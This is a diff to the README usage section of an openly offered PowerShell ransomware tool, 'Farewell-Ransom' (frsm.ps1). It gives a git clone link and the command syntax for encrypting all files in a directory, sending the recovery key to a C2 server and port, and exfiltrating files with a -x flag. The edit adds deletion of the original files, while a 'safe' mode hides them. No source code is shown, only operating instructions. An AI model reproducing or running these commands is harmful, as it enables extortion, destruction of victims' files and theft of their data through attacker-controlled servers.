@@ -33,14 +33,15 @@ git clone https://github.com/BZHack/Farewell-Ransom
         generic ransomware in PowerShell with C2 capabilities
 
  Usage: .\frsm.ps1.ps1 -e Directory -s C2Server -p C2Port
-          Encrypt all files & sends recovery key to C2Server
+          Encrypt all files & sends recovery key to C2Server & Delete the original files
           Use -x to exfiltrate and decrypt files on C2Server
 
         .\frsm.ps1 -d Directory -k RecoveryKey
           Decrypt all files with recovery key string
 
- Usage safe: .\frsm.ps1 -se Directory -s C2Server -p C2Port
-          Encrypt all files & sends recovery key to C2Server
+ Usage safe: 
+         .\frsm.ps1 -se Directory -s C2Server -p C2Port
+          Encrypt all files & sends recovery key to C2Server & Hide the original files
           Use -x to exfiltrate and decrypt files on C2Server
 
         .\frsm.ps1 -de Directory -k RecoveryKey
